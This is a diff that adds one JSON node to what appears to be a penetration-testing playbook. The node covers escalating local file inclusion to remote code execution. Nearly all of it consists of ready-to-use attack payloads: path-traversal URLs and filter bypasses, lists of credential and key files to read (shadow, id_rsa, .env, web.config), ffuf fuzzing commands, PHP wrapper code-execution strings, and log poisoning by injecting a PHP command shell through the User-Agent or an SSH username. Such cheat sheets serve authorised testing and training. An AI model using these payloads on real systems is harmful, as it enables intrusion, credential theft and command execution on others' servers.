@@ -1,0 +1,30 @@
+{
+  "id": "lfi",
+  "phase": "WEB",
+  "title": "Local File Inclusion → RCE",
+  "body": "LFI alone gets file reads. Escalate to RCE via log poisoning, PHP wrappers, or /proc/self/environ. Windows paths are completely different — know both. Use wordlists to find files fast.",
+  "cmd": "# -- DETECTION ----------------------------\nhttp://$ip/page?file=../../../../etc/passwd\nhttp://$ip/page?file=../../../etc/passwd\nhttp://$ip/page?file=/etc/passwd\n\n# -- FILTER BYPASSES ----------------------\n# Null byte (PHP < 5.3.4)\nhttp://$ip/page?file=../../../../etc/passwd%00\n# Double encode\nhttp://$ip/page?file=..%252f..%252f..%252fetc%252fpasswd\n# Path truncation (old PHP)\nhttp://$ip/page?file=../../../../etc/passwd/././././././././././././././././.\n\n# -- LINUX HIGH-VALUE FILES ----------------\n/etc/passwd\n/etc/shadow\n/etc/hosts\n/etc/crontab\n/proc/self/environ\n/proc/self/cmdline\n/var/log/apache2/access.log\n/var/log/apache2/error.log\n/var/log/nginx/access.log\n/var/log/auth.log\n/home/[user]/.ssh/id_rsa\n/home/[user]/.bash_history\n/var/www/html/config.php\n/var/www/html/.env\n/var/www/html/wp-config.php\n\n# -- WINDOWS HIGH-VALUE FILES --------------\n# win.ini = LFI canary on Windows — confirms it works\nC:/Windows/win.ini\nC:/Windows/System32/drivers/etc/hosts\nC:/inetpub/wwwroot/web.config              # IIS — often has DB creds\nC:/Windows/System32/inetsrv/config/applicationHost.config  # app pool creds\nC:/xampp/apache/conf/httpd.conf\nC:/xampp/FileZillaFTP/FileZilla Server.xml  # FTP creds\nC:/ProgramData/MySQL/MySQL Server 5.5/my.ini\nC:/Users/Administrator/Desktop/proof.txt\nC:/Windows/repair/SAM\n\n# Windows path traversal variations (try all)\n..\\..\\..\\Windows\\win.ini\n....//....//....//Windows/win.ini\n%5c..%5c..%5cWindows%5cwin.ini\n\n# -- FFUF LFI WORDLIST FUZZING -------------\n# Linux\nffuf -u \"http://$ip/page?file=FUZZ\"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt   -fw 0 -t 50\n\n# Windows — dedicated Windows path list\nffuf -u \"http://$ip/page?file=FUZZ\"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0 -t 50 -mc 200\n\n# Combined both OS (thorough)\nffuf -u \"http://$ip/page?file=FUZZ\"   -w /opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt   -fw 0 -t 50\n\n# Add traversal prefix if basic path blocked\nffuf -u \"http://$ip/page?file=../../../FUZZ\"   -w /opt/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt   -fw 0\n\n# -- PHP WRAPPERS --------------------------\n# Source code read (base64 encode)\nphp://filter/convert.base64-encode/resource=index.php\nphp://filter/convert.base64-encode/resource=../config.php\n# Decode: echo \"BASE64OUTPUT\" | base64 -d\n\n# RCE via data wrapper (needs allow_url_include=On)\ndata://text/plain,<?php system('id')?>\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\n\n# -- LOG POISONING → RCE ------------------\n# Step 1: Inject PHP into access log via User-Agent\ncurl -A \"<?php system($_GET['cmd']); ?>\" http://$ip/\n# Or via SSH login attempt (hits auth.log):\nssh '<?php system($_GET[\"cmd\"]); ?>'@$ip\n\n# Step 2: Include log with command parameter\nhttp://$ip/page?file=/var/log/apache2/access.log&cmd=id\nhttp://$ip/page?file=/var/log/auth.log&cmd=id",
+  "warn": "Windows LFI: always try win.ini first as your canary. If it reads, LFI is confirmed on Windows. web.config and applicationHost.config frequently contain plaintext credentials — highest value reads on a Windows/IIS target.",
+  "choices": [
+    {
+      "label": "Log poisoning RCE — get shell",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "PHP wrapper RCE working",
+      "next": "reverse_shell"
+    },
+    {
+      "label": "Found SSH key",
+      "next": "ssh_key"
+    },
+    {
+      "label": "Found creds in config / web.config",
+      "next": "creds_found"
+    },
+    {
+      "label": "Need custom wordlist for deeper fuzzing",
+      "next": "custom_wordlist"
+    }
+  ]
+}
